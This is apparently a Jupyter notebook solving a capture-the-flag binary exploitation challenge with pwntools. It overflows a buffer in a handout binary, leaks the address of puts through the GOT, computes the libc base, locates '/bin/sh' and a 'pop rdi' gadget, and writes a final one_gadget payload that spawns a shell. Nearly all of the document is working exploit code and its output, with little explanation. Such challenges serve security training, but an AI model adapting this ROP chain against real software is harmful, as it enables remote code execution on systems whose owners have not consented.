In [ ]:
from pwn import ELF, ROP, flat, context

context.arch = "amd64"

In [94]:
offset = 40

chal = ELF("./handout/chal")
main = chal.symbols["main"]
pop_rda = main - 2
ret = main - 1
payload = flat(
    b"A" * (offset - 8),
    chal.bss(0x400), # saved rbp
    pop_rda,
    chal.got["puts"],
    main + 19,  # mov rdi, rax; call puts;
    word_size=64,
    length=0x47,
)

In [95]:
with open("payload.bin", "wb") as f:
    f.write(payload)

In [96]:
libc = ELF("./handout/pwndbg-libc.so.6")
puts_addr = 0x7FFFF7E435A0
libc.address = puts_addr - libc.symbols["puts"]
libc_rop = ROP(libc)

In [97]:
binsh_addr = list(libc.search(b"/bin/sh"))[0]
hex(binsh_addr)

'0x7ffff7f68ea4'

In [98]:
rdi_gadget = libc_rop.find_gadget(["pop rdi", "ret"])[0]
hex(rdi_gadget)

'0x7ffff7ded145'

In [99]:
one_gadget = libc.address + 0xDDF83

In [100]:
payload = flat(
    b"A" * (offset - 8),
    chal.bss(0x400), # saved rbp
    one_gadget,
    word_size=64,
    length=0x47,
)

In [101]:
with open("payload.bin", "ab") as f:
    f.write(payload)